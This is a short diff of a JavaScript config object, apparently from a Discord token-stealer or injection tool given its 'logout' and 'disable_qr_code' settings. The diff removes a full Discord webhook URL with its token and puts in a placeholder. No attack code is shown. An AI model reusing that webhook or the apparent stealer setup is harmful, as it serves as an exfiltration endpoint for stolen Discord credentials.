@@ -13,7 +13,7 @@ const fs = require("fs");
 var config = {
     brand: "FIJI",
 
-    webhook: "https://discord.com/api/webhooks/1144778934983086110/VKwgFjDliynmlDE32zcjv-wqkNVbBFuWPiTEBPF_Slk34euxyvkFaLwiSBToFvaul20f",
+    webhook: "REPLACE_ME",
 
     logout: true,
     disable_qr_code: true,
